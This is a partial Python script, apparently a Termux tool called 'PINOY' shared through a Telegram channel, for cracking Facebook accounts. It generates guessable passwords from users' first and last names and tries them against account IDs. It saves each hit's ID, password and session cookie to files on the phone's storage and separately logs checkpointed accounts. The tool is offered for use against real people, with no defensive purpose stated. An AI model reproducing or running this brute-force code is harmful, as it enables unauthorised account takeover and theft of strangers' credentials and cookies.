#==================[OWNER]==================#
#CODDED BY ARAFAT
#Send by : https://t.me/KGF_TERMUX_TEAM
#==================[MODULE]==================#
import os
import sys
import time
...
logo = f'''
\x1b[38;5;46m8888888b. 8888888 888b    888  .d88888b. Y88b   d88P
\x1b[38;5;46m888   Y88b  888   8888b   888 d88P" "Y88b Y88b d88P
\x1b[38;5;46m888    888  888   88888b  888 888     888  Y88o88P
\x1b[38;5;46m888   d88P  888   888Y88b 888 888     888   Y888P  
\x1b[38;5;46m8888888P"   888   888 Y88b888 888     888    888  
\x1b[38;5;46m888         888   888  Y88888 888     888    888
\x1b[38;5;46m888         888   888   Y8888 Y88b. .d88P    888 
\x1b[38;5;46m888       8888888 888    Y888  "Y88888P"     888 "'
\033[1;37m=====================================================\x1b[1;97m
\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m AUTHOR {R}>> {G}SIXTO HIRAYU 
\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m GITHAB {R}>> {G}SIXTO
...
def mmku():
    ...
    if psw in ['1', '01']:
       ...
       plist.append('last1234567')
       plist.append('first12345678')
       plist.append('last12345678')
       plist.append('FirstLast')
       plist.append('LastFirst')
       plist.append('First Last')
       plist.append('Last First')
    ...
    try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                open('/sdcard/PINOY-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R} <[PINOY-CP]>{B} '+ids+f'{G} |{G} '+pas+'\033[1;97m')
    ...
    try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\033[1;32m[PINOY-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                print(f"\033[1;32m<[🍪]> {coki}");linex()
                open('/sdcard/PINOY-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{B} <[PINOY-CP]> '+ids+f'{Y} |{Y} '+pas+'\033[1;97m')
                open('/sdcard/PINOY-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
    ...
    try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\033[1;32m[PINOY-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                print(f"\033[1;32m<[🍪]> {coki}");linex()
                open('/sdcard/PINOY-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{B} <[PINOY-CP]> '+ids+f'{Y} |{Y} '+pas+'\033[1;97m')
